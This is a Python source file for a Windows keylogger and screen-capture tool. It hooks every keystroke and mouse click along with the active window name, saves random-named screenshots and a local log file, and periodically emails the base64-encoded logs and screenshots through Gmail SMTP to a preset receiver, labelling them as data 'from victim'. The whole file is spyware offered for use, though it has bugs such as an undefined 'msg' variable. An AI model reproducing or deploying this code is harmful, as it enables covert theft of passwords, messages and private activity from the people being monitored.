import sys
import os
import time
import random
import win32api
import pythoncom
import pyHook
import smtplib
import pyautogui
import base64
import string
# from _winreg

global t, start_time, pics_names, email, password, receiver, interval

t = ""
pics_names = []
email = ""  # email?
password = ""  # email password
receiver = ""  # reciever email address
interval = 60

try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()


def ScreenShot():
    global pics_names

    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


def Mail_it(data, pics_names):
    data = base64.b64encode(data)
    data = 'New data from victim(Base64 encoded)\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(email, password)
    server.sendmail(email, receiver, data)
    server.close()

    for pic in pics_names:
        data = base64.b64encode(open(pic, 'r+').read())
        data = 'New pic data from victim(Base64 encoded)\n' + data
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(email, password)
        server.sendmail(email, receiver, msg.as_string())
        server.close()


def OnMouseEvent(event):
    global email, password, receiver, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' + \
        ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='
    global t, start_time, pics_names
    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global email, password, receiver, interval
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' + \
        ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='
    global t, start_time
    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        Mail_it(t, pics_names)
        t = ''

    return True


hook = pyHook.HookManager()
hook.KeyDown = OnKeyboardEvent
hook.MouseAllButtonsDown = OnMouseEvent
hook.HookKeyboard()
hook.HookMouse()
start_time = time.time()
pythoncom.PumpMessages()
